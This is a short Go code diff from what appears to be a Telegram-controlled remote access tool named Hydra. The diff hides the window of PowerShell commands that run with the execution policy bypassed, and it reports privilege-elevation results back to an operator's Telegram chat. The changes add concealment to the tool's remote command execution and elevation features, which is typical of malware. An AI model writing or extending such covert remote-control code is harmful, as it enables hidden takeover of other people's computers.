@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/Raffy27/Hydra/api"
@@ -38,6 +39,7 @@ func Reset() {
 
 func Shell(command string) {
 	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	b, err := cmd.CombinedOutput()
 	out := string(b)
 	if err != nil {
@@ -92,8 +94,12 @@ func Download(args string) {
 	}
 }
 
+//Command handler for /root
 func Elevate() {
 	err := util.ElevateLogic()
 	cfg := tgbotapi.NewMessage(util.ChatID, fmt.Sprintf(fmtRoot, err))
+	if err == nil {
+		cfg.Text = "Elevation successful"
+	}
 	api.Bot.Send(cfg)
 }
